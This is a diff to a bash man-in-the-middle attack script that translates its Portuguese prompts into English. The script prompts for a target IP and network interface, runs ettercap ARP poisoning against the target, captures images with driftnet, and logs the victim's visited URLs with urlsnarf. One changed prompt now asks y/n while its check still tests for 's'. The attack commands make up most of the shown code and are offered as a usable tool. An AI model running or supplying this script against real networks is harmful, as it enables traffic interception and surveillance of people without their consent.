@@ -7,7 +7,7 @@
                            #aqui inicia a verificação de pacotes para instalação
 
 
-echo -e "Estamos analisando os pacotes necessários...\n"
+echo -e "Analyzing packages...\n"
 pacote=$(dpkg --get-selections | grep ettercap-text-only )
 if [ -n "$pacote" ] ;
   sleep 1
@@ -70,49 +70,49 @@ echo "                Movement On network"
 echo -e "Dev: @sysrogue\n"
 echo "------------------------------------------"
     echo
-    echo -n "Localizar o IP do alvo, s/n? "
+    echo -n "Find the IP of the target router, y/n? "
  read v0
-if [ "$v0" = s ] ;
+if [ "$v0" = y ] ;
  then 
     route
     echo "------------------------------------------"
     echo
-    echo "Insira o IP do alvo."
+    echo "Enter the target IP."
     echo -n ">> " ;read IP
     echo "------------------------------------------"
     echo
    else
     echo
     echo "------------------------------------------"
-   echo "Insira o IP do alvo"
+   echo "Enter the target IP"
     echo -n ">> " ;read IP
     echo "------------------------------------------"
     echo
 fi    
     echo
-    echo "insira interface de rede utilizada"
+    echo "Enter the network interface used"
     echo -n ">>" ;read int
     echo "------------------------------------------"
-     echo -n "Inserir host alvo, s/n? "
+     echo -n "Insert target host, y/n? "
      read V
 
 #--------------------------------------------------------------------------------------------------------------
                                       #inicio do ataque MITM
 
-if [[ "$V" = s ]]; then
+if [[ "$V" = y ]]; then
     echo -n ">> " ; read alvo
     driftnet -i $int&
-    xterm -e ./alvo.sh&
+    xterm -e ./target.sh&
     xterm -e ettercap -T -q -i $int -M arp:remote /$IP//&
-    urlsnarf -i $int | grep $alvo > url.txt
+    urlsnarf -i $int | grep $alvo > log.txt
 elif [[ "$V" = n ]]; then
     driftnet -i $int&
-    xterm -e ./alvo.sh&
+    xterm -e ./target.sh&
     xterm -e ettercap -T -q -i $int -M arp:remote /$IP//&
-    urlsnarf -i $int > url.txt
+    urlsnarf -i $int > log.txt
 else
   echo "------------------------------------------"
-  echo "Entrada desconhecida, deseja executar o script novamente s/n?"
+  echo "Unknown entry, run the script again. y/n?"
   echo -n ">>" ; read v1
   if [[ "$v1" = s ]]; then
     ./mitm.sh
